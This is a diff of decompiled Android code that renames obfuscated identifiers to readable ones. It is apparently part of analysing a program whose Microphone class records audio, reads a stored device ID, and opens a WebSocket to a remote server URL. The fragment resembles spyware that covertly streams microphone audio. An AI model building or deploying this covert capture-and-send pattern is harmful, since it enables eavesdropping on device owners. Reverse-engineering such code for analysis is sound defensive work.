@@ -20,8 +20,8 @@ import android.content.Context;
 import android.media.AudioRecord;
 import android.media.audiofx.AcousticEchoCanceler;
 import androidx.core.app.ActivityCompat;
-import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
-import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;
+import linker.resourcer.encoder.ConfigurationConstants;
+import linker.resourcer.encoder.SharedPreferencesManager;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
@@ -75,7 +75,7 @@ public class Microphone {
             @Override
             public void run() {
                 Microphone.access$002(new OkHttpClient());
-                Request request = new Request.Builder().url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build();
+                Request request = new Request.Builder().url(ConfigurationConstants.URL_SOCKT()).build();
                 ws = client.newWebSocket(request, new WebSocketListener(this){
                     final 1 this$0;
                     {
@@ -87,9 +87,9 @@ public class Microphone {
                             String string5;
                             String string6;
                             block7: {
-                                string6 = vyklwirattpkwkqagsbrm.Read(object, "ID", "Deviceid");
-                                String string7 = vyklwirattpkwkqagsbrm.Read(object, aaskrfyvhoypymnzlskbzwpyr.THE_IDF, null);
-                                string5 = vyklwirattpkwkqagsbrm.Read(object, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, "null");
+                                string6 = SharedPreferencesManager.Read(object, "ID", "Deviceid");
+                                String string7 = SharedPreferencesManager.Read(object, ConfigurationConstants.THE_IDF, null);
+                                string5 = SharedPreferencesManager.Read(object, ConfigurationConstants.THE_CIP, "null");
                                 object = string7;
                                 if (!string3.equals("null")) {
                                     object = string3;
